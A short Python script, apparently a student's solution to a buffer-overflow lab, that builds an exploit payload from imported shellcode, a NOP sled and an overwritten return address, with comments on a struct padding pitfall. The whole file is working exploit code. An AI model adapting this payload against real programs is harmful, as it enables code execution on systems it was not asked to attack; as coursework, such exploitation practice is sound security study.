import sys
import struct
from shellcode import shellcode

operate_buffer = 0x08049fe4
sys.stdout.buffer.write(struct.pack('23s',shellcode)+struct.pack('1013s',b'\x90'*1036)+ struct.pack('<I',operate_buffer))
#leave off the x in '23s x'. This confused me the whole project becasue c thinks of padding byte as null byte it ignores it.
#This causes difference between python sol6.py | xxd and what is on the stack during execution.